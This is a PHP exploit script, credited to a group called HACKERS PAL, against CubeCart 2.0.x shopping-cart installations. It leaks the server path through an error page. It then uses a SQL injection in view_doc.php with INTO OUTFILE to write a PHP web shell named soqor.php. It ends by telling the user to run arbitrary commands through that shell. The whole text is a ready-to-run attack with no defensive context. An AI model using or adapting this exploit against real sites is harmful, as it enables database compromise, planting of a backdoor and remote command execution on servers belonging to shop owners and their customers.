/***************************************/

Exploit :-

#!/usr/bin/php -q -d short_open_tag=on
&lt;?
/*
/* CubeCart Remote sql injection exploit
/*            By : HACKERS PAL
/*             WwW.SoQoR.NeT
/*
/* Tested on CubeCart 2.0.X  and maybe other versions are injected
*/
print_r(&#039;
/**********************************************/
/*   CubeCart Remote sql injection exploit    */
/*     by HACKERS PAL &lt;security@soqor.net&gt;    */
/*         site: http://www.soqor.net         */&#039;);
if ($argc&lt;2) {
print_r(&#039;
/* --                                         */
/* Usage: php &#039;.$argv[0].&#039; host
/* Example:                                   */
/*  php &#039;.$argv[0].&#039; http://localhost/CubeCart/
/**********************************************/
&#039;);
die;
}
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

$url=$argv[1];
$exploit1=&quot;/cat_navi.php&quot;;
         Function get_page($url)
         {

                  if(function_exists(&quot;file_get_contents&quot;))
                  {

                       $contents = file_get_contents($url);

                          }
                          else
                          {
                              $fp=fopen(&quot;$url&quot;,&quot;r&quot;);
                              while($line=fread($fp,1024))
                              {
                               $contents=$contents.$line;
                              }


                                  }
                       return $contents;
         }

     $page = get_page($url.$exploit1);

             $pa=explode(&quot;&lt;b&gt;&quot;,$page);
             $pa=explode(&quot;&lt;/b&gt;&quot;,$pa[2]);
             $path = str_replace(&quot;cat_navi.php&quot;,&quot;&quot;,$pa[0]).&quot;soqor.php&quot;;
             $var=&#039;\ &#039;;
             $var  = str_replace(&quot; &quot;,&quot;&quot;,$var);
             $path = str_replace($var,&quot;/&quot;,$path);
             $exploit2=&quot;/view_doc.php?view_doc=-1&#039;%20union%20select%20&#039;&lt;?php%20system(&quot;.&#039;$_GET[cmd]&#039;.&quot;);%20?&gt;&#039;,&#039;WwW.SoQoR
.NeT&#039;%20INTO%20OUTFILE%20&#039;$path&#039;%20from%20store_docs/*&quot;;
     $page_now = get_page($url.$exploit2);
     if(ereg(&quot;mysql_fetch_array()&quot;,$page_now))
     {
          $newurl=$url.&quot;/soqor.php?cmd=id&quot;;
          Echo &quot;\n[+] Go TO &quot;.str_replace(&quot;//&quot;,&quot;/&quot;,$newurl).&quot;\n[+] Change id to any command you want :)&quot;;
     }
     else
     {
          Echo &quot;\n[-] Exploit Faild&quot;;
     }
     Die(&quot;\n/* Visit us : WwW.SoQoR.NeT                   */\n/**********************************************/&quot;);

?&gt;

